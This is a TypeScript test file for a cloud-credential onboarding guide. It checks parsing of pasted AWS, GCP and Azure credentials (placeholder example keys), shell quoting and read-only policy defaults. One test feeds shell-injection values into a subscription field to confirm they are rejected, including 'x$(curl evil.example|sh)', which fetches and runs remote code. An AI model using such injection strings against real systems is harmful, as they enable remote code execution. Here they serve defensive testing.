import test from 'node:test';
import assert from 'node:assert/strict';

import {
  applyCloudPaste,
  awsAttenuation,
  awsProfileBlocker,
  awsProfileNote,
  azureRestExample,
  cloudAgentName,
  cloudCaptureComplete,
  cloudConnectCommand,
  cloudProvisionScript,
  gcpKeyEmail,
  maskCredential,
  parseCloudPaste,
} from '../src/cloud-guide';
import { buildAwsProfileCloudSetup } from '../src/cloud-setup';
import type { ConnectionDraft } from '../src/app-state';

const GCP_KEY = JSON.stringify({
  type: 'service_account',
  project_id: 'acme-prod-examples',
  private_key_id: '9f1e88c0aa55',
  private_key: '-----BEGIN PRIVATE KEY-----\nMIIEvEXAMPLEONLY\n-----END PRIVATE KEY-----\n',
  client_email: 'multitool-agent@acme-prod-examples.iam.gserviceaccount.com',
  token_uri: 'https://oauth2.googleapis.com/token',
}, null, 2);

test('AWS paste recognizes the console access-key CSV', () => {
  const parsed = parseCloudPaste('aws',
    'Access key ID,Secret access key\nAKIAIOSFODNN7EXAMPLE,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  assert.ok(parsed);
  assert.equal(parsed.fields.access, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(parsed.fields.secret, 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  // The CSV carries no region; the slot stays open for the fill-in.
  assert.equal(parsed.fields.region, undefined);
});

test('AWS paste reads CSV columns by header, not position', () => {
  // The IAM user-creation CSV leads with the user name and console
  // password. Taking the first two columns would capture that password as
  // the secret access key and mark the slot captured.
  const parsed = parseCloudPaste('aws',
    'User name,Password,Access key ID,Secret access key,Console login link\n'
    + 'multitool-agent,hunter2,AKIAIOSFODNN7EXAMPLE,'
    + 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY,https://example.signin.aws.amazon.com/console');
  assert.ok(parsed);
  assert.equal(parsed.fields.access, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(parsed.fields.secret, 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
});

test('AWS paste recognizes env exports, region included', () => {
  const parsed = parseCloudPaste('aws', [
    'export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
    'export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'export AWS_DEFAULT_REGION=us-west-2',
  ].join('\n'));
  assert.ok(parsed);
  assert.equal(parsed.fields.access, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(parsed.fields.secret, 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  assert.equal(parsed.fields.region, 'us-west-2');
});

test('AWS paste recognizes a credentials-file profile', () => {
  const parsed = parseCloudPaste('aws', [
    '[multitool-agent]',
    'aws_access_key_id = AKIAIOSFODNN7EXAMPLE',
    'aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'region = eu-central-1',
  ].join('\n'));
  assert.ok(parsed);
  assert.equal(parsed.fields.access, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(parsed.fields.region, 'eu-central-1');
});

test('AWS paste recognizes create-access-key JSON, nested or projected', () => {
  const nested = parseCloudPaste('aws', JSON.stringify({
    AccessKey: {
      UserName: 'multitool-agent',
      AccessKeyId: 'AKIAIOSFODNN7EXAMPLE',
      SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      Status: 'Active',
    },
  }, null, 2));
  assert.equal(nested?.fields.access, 'AKIAIOSFODNN7EXAMPLE');

  // The provisioning script prints a --query projection keyed by env names.
  const projected = parseCloudPaste('aws', JSON.stringify({
    AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE',
    AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
  }, null, 2));
  assert.equal(projected?.fields.access, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(projected?.fields.secret, 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
});

test('GCP paste recognizes a service-account JSON key', () => {
  const parsed = parseCloudPaste('gcp', GCP_KEY);
  assert.ok(parsed);
  assert.equal(parsed.fields.project, 'acme-prod-examples');
  assert.match(parsed.source, /multitool-agent@acme-prod-examples/);
  assert.ok(parsed.fields.keyJson);
  assert.equal(gcpKeyEmail(parsed.fields.keyJson),
    'multitool-agent@acme-prod-examples.iam.gserviceaccount.com');
});

test('GCP paste refuses non-key JSON', () => {
  assert.equal(parseCloudPaste('gcp', '{"type":"authorized_user"}'), null);
  assert.equal(parseCloudPaste('gcp', 'not json at all'), null);
});

test('Azure paste recognizes create-for-rbac, and account show fills the subscription', () => {
  const rbac = JSON.stringify({
    appId: '22222222-2222-2222-2222-222222222222',
    displayName: 'multitool-agent',
    password: '8Q~EXAMPLEexampleEXAMPLEexample~pl',
    tenant: '11111111-1111-1111-1111-111111111111',
  }, null, 2);
  const alone = parseCloudPaste('azure', rbac);
  assert.equal(alone?.fields.client, '22222222-2222-2222-2222-222222222222');
  assert.equal(alone?.fields.tenant, '11111111-1111-1111-1111-111111111111');
  assert.equal(alone?.fields.subscription, undefined);

  const both = parseCloudPaste('azure', rbac + '\n' + JSON.stringify({
    environmentName: 'AzureCloud',
    id: '33333333-3333-3333-3333-333333333333',
    name: 'Acme Production',
    tenantId: '11111111-1111-1111-1111-111111111111',
  }, null, 2));
  assert.equal(both?.fields.subscription, '33333333-3333-3333-3333-333333333333');
  assert.equal(both?.fields.clientSecret, '8Q~EXAMPLEexampleEXAMPLEexample~pl');
});

test('applying an AWS paste routes values into fresh credential slots', () => {
  const draft: ConnectionDraft = {
    cloudProvider: 'aws',
    cloudRegion: 'us-east-1',
    cloudAccessKeyRef: 'OLD_REF',
    cloudCredentialSources: { awsAccessKey: 'existing', awsSecretKey: 'new', awsSessionToken: 'none' },
  };
  const applied = applyCloudPaste(draft, 'aws',
    'Access key ID,Secret access key\nAKIAIOSFODNN7EXAMPLE,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  assert.equal(draft.cloudAccessKeyValue, 'AKIAIOSFODNN7EXAMPLE');
  assert.equal(draft.cloudSecretKeyValue, 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  assert.equal(draft.cloudAccessKeyRef, null);
  assert.equal(draft.cloudCredentialSources?.awsAccessKey, 'new');
  // The paste named no region, so the prefill survives.
  assert.equal(draft.cloudRegion, 'us-east-1');
  assert.ok(applied.source);
  assert.ok(applied.clearedErrorKeys.includes('cloudAccessKeyRef'));

  applyCloudPaste(draft, 'aws', 'export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n'
    + 'export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n'
    + 'export AWS_DEFAULT_REGION=us-west-2');
  // An explicit region in the paste overrides the prefill.
  assert.equal(draft.cloudRegion, 'us-west-2');
});

test('applying a GCP paste fills the project only when it is still empty', () => {
  const draft: ConnectionDraft = { cloudProvider: 'gcp' };
  applyCloudPaste(draft, 'gcp', GCP_KEY);
  assert.equal(draft.cloudProject, 'acme-prod-examples');
  assert.equal(draft.cloudCredentialSources?.gcpKey, 'new');

  const pinned: ConnectionDraft = { cloudProvider: 'gcp', cloudProject: 'my-chosen-project' };
  applyCloudPaste(pinned, 'gcp', GCP_KEY);
  assert.equal(pinned.cloudProject, 'my-chosen-project');
});

test('an unrecognized paste applies nothing', () => {
  const draft: ConnectionDraft = { cloudProvider: 'aws', cloudRegion: 'us-east-1' };
  const applied = applyCloudPaste(draft, 'aws', 'utter nonsense');
  assert.equal(applied.source, null);
  assert.deepEqual(applied.clearedErrorKeys, []);
  assert.equal(draft.cloudAccessKeyValue, undefined);
});

test('capture completeness gates the Continue step', () => {
  const draft: ConnectionDraft = { cloudProvider: 'aws', cloudRegion: 'us-east-1' };
  assert.equal(cloudCaptureComplete(draft, 'aws'), false);
  applyCloudPaste(draft, 'aws',
    'Access key ID,Secret access key\nAKIAIOSFODNN7EXAMPLE,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
  assert.equal(cloudCaptureComplete(draft, 'aws'), true);

  const azure: ConnectionDraft = { cloudProvider: 'azure' };
  applyCloudPaste(azure, 'azure', JSON.stringify({
    appId: '22222222-2222-2222-2222-222222222222',
    password: '8Q~EXAMPLEexampleEXAMPLEexample~pl',
    tenant: '11111111-1111-1111-1111-111111111111',
  }));
  // Subscription still missing: not complete until the fill-in lands.
  assert.equal(cloudCaptureComplete(azure, 'azure'), false);
  azure.cloudSubscriptionId = '33333333-3333-3333-3333-333333333333';
  assert.equal(cloudCaptureComplete(azure, 'azure'), true);
});

test('existing credentials picked in the one-shot form count as captured', () => {
  const draft: ConnectionDraft = {
    cloudProvider: 'aws',
    cloudRegion: 'us-west-2',
    cloudAccessKeyRef: 'TEAM_AWS_ACCESS_KEY_ID',
    cloudSecretKeyRef: 'TEAM_AWS_SECRET_ACCESS_KEY',
    cloudCredentialSources: { awsAccessKey: 'existing', awsSecretKey: 'existing' },
  };
  assert.equal(cloudCaptureComplete(draft, 'aws'), true);
});

test('the provisioning script carries the chosen access level', () => {
  assert.match(cloudProvisionScript('aws', 'ReadOnlyAccess'),
    /arn:aws:iam::aws:policy\/ReadOnlyAccess/);
  assert.match(cloudProvisionScript('gcp', 'roles/editor'), /--role roles\/editor/);
  assert.match(cloudProvisionScript('azure', 'Contributor'), /--role Contributor/);
  // What the scripts print is what the paste parsers accept.
  const awsOut = JSON.stringify({ AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE', AWS_SECRET_ACCESS_KEY: 'x'.repeat(40) });
  assert.ok(parseCloudPaste('aws', awsOut));
});

test('the provisioning script names the identity after the connection', () => {
  const script = cloudProvisionScript('aws', 'ReadOnlyAccess', cloudAgentName('AWS Prod (main)'));
  assert.match(script, /create-user --user-name multitool-aws-prod-main/);
  // No stray multitool-agent default once a connection name exists.
  assert.doesNotMatch(script, /multitool-agent/);
});

test('agent names fit the tightest provider constraints', () => {
  // GCP service-account ids: ≤30 chars, lowercase/digits/hyphens.
  const long = cloudAgentName('Amazon Web Services Production Environment');
  assert.ok(long.length <= 30, long);
  assert.match(long, /^multitool-[a-z0-9][a-z0-9-]*$/);
  assert.equal(cloudAgentName(''), 'multitool-agent');
  assert.equal(cloudAgentName('  ***  '), 'multitool-agent');
  assert.equal(cloudAgentName('Größe & Ümlaut'), 'multitool-gr-e-mlaut');
});

test('connect commands quote the connection name once, for every surface', () => {
  assert.equal(cloudConnectCommand('aws', "ray's prod"),
    "multitool cloud install 'ray'\"'\"'s prod'");
  assert.equal(cloudConnectCommand('gcp', 'gcp-prod'),
    'eval "$(multitool cloud env \'gcp-prod\')"');
});

test('the Azure example call scopes to the subscription when known', () => {
  assert.match(azureRestExample('33333333-3333-3333-3333-333333333333'),
    /subscriptions\/33333333-3333-3333-3333-333333333333\/resourceGroups/);
  assert.match(azureRestExample(null), /subscriptions\?api-version/);
  assert.match(azureRestExample('  '), /subscriptions\?api-version/);
  assert.match(azureRestExample(null), /Authorization=Bearer \$AZURE_ACCESS_TOKEN/);
});

test('the Azure example never interpolates a non-GUID subscription', () => {
  // The example rides inside a double-quoted shell string, where $(…) and
  // backticks are live. The guided flow saves only GUIDs, but the core and
  // CLI accept any string, so the render site must not trust the field.
  for (const hostile of [
    'x$(curl evil.example|sh)',
    '`touch /tmp/pwned`',
    '33333333-3333-3333-3333-333333333333/extra',
    'prefix-33333333-3333-3333-3333-333333333333',
  ]) {
    const command = azureRestExample(hostile);
    assert.equal(command.includes(hostile), false, hostile);
    assert.match(command, /subscriptions\?api-version/);
  }
});

test('an ARM resource id is not mistaken for a subscription id', () => {
  const paste = JSON.stringify({
    id: '/subscriptions/33333333-3333-3333-3333-333333333333/resourceGroups/x',
    tenantId: '11111111-1111-1111-1111-111111111111',
  });
  assert.equal(parseCloudPaste('azure', paste)?.fields.subscription, undefined);
});

test('profiles the broker cannot mint from are blocked, with the reason', () => {
  assert.equal(awsProfileBlocker({ name: 'default', kind: 'keys' }), null);
  assert.equal(awsProfileBlocker({ name: 'dev', kind: 'temporary' }), null);
  assert.match(awsProfileBlocker({ name: 'sso', kind: 'sso' }) ?? '', /Identity Center/);
  assert.match(awsProfileBlocker({ name: 'half', kind: 'incomplete' }) ?? '', /No active aws access keys/);
  // A temporary profile is usable but carries a caveat.
  assert.match(awsProfileNote({ name: 'dev', kind: 'temporary' }) ?? '', /expire/);
  assert.equal(awsProfileNote({ name: 'default', kind: 'keys' }), null);
});

test('the attenuation preset carries a real managed-policy ARN', () => {
  assert.equal(awsAttenuation('read').policyArn, 'arn:aws:iam::aws:policy/ReadOnlyAccess');
  assert.equal(awsAttenuation('power').policyArn, 'arn:aws:iam::aws:policy/PowerUserAccess');
  // Opting out of the leash is explicit, not a missing value.
  assert.equal(awsAttenuation('full').policyArn, null);
  // Unknown or absent selections fall back to the most restrictive option.
  assert.equal(awsAttenuation(undefined).id, 'read');
  assert.equal(awsAttenuation('nonsense').id, 'read');
});

test('a reuse connection carries the profile, machine, and leash, and vaults nothing', () => {
  const built = buildAwsProfileCloudSetup({
    cloudProvider: 'aws',
    cloudSourceProfile: 'acme-dev',
    cloudSourceOrigin: 'machine-abc',
    cloudSourceOriginLabel: '/Users/raymond',
    cloudAttenuation: 'read',
    cloudSessionTtl: '900',
  });
  assert.deepEqual(built.errors, {});
  assert.deepEqual(built.newSecrets, []);
  assert.equal(built.input.cloud_source_profile, 'acme-dev');
  // The machine stamp is what stops another broker reading its own ~/.aws.
  assert.equal(built.input.cloud_source_origin, 'machine-abc');
  assert.equal(built.input.cloud_source_origin_label, '/Users/raymond');
  assert.equal(built.input.cloud_session_policy_arn, 'arn:aws:iam::aws:policy/ReadOnlyAccess');
  // Blank region means "use whatever the profile names", not a validation error.
  assert.equal(built.input.cloud_region, null);
  assert.equal('cloud_access_key_ref' in built.input, false);
});

test('the default leash is what the checked radio shows: read-only, submitted', () => {
  // The sheet preselects "Read-only" without firing onChange, so a draft
  // that never touched the attenuation radio must still submit the
  // ReadOnlyAccess session policy — not the unbounded null shape.
  const untouched = buildAwsProfileCloudSetup({
    cloudProvider: 'aws',
    cloudSourceProfile: 'acme-admin',
    cloudSourceOrigin: 'machine-abc',
  });
  assert.deepEqual(untouched.errors, {});
  assert.equal(
    untouched.input.cloud_session_policy_arn,
    'arn:aws:iam::aws:policy/ReadOnlyAccess',
  );
  // Dropping the leash is an explicit choice, and only then is null sent.
  const full = buildAwsProfileCloudSetup({
    cloudProvider: 'aws',
    cloudSourceProfile: 'acme-admin',
    cloudSourceOrigin: 'machine-abc',
    cloudAttenuation: 'full',
  });
  assert.equal(full.input.cloud_session_policy_arn, null);
});

test('the reuse build never inherits the capture path region prefill', () => {
  // Every AWS draft starts with cloudRegion "us-east-1" for the vaulted-key
  // path; the reuse flow renders no region field, so that prefill must not
  // pin reuse connections to us-east-1 — blank means the profile's region.
  const built = buildAwsProfileCloudSetup({
    cloudProvider: 'aws',
    cloudSourceProfile: 'acme-dev',
    cloudSourceOrigin: 'machine-abc',
    cloudRegion: 'us-east-1',
  });
  assert.deepEqual(built.errors, {});
  assert.equal(built.input.cloud_region, null);
});

test('a reuse connection needs a profile and a machine stamp', () => {
  assert.match(
    buildAwsProfileCloudSetup({ cloudProvider: 'aws' }).errors.cloudSourceProfile,
    /Choose one/,
  );
  // A profile without the machine it lives on would fail closed at mint
  // time; refuse it while the user is still here to fix it.
  assert.match(
    buildAwsProfileCloudSetup({
      cloudProvider: 'aws', cloudSourceProfile: 'default',
    }).errors.cloudSourceProfile,
    /identify this machine/,
  );
});

test('a reuse connection rejects a bare external ID', () => {
  const bad = buildAwsProfileCloudSetup({
    cloudProvider: 'aws',
    cloudSourceProfile: 'default',
    cloudSourceOrigin: 'machine-abc',
    cloudExternalId: 'customer-123',
  });
  assert.match(bad.errors.cloudExternalId, /role ARN/);
});

test('masking shows the edges only', () => {
  assert.equal(maskCredential('AKIAIOSFODNN7EXAMPLE'), 'AKIA…MPLE');
  assert.equal(maskCredential('short'), '••••');
});
